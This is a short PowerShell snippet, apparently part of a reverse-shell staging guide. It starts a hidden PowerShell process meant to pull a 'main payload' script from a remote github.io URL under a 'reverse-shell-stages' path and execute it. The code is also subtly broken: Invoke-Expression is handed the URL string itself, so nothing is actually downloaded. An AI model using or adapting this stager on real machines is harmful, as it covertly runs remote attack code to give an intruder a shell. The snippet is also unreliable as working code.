```powershell
# PowerShell command to run your main payload script.
Start-Process -WindowStyle Hidden -NoNewWindow powershell.exe -ArgumentList "-noj -noprofile -Command `\"$url =
'https://submerse.github.io/blog/reverse-shell-stages/main_payload.ps1'; Invoke-Expression $url;\""
```
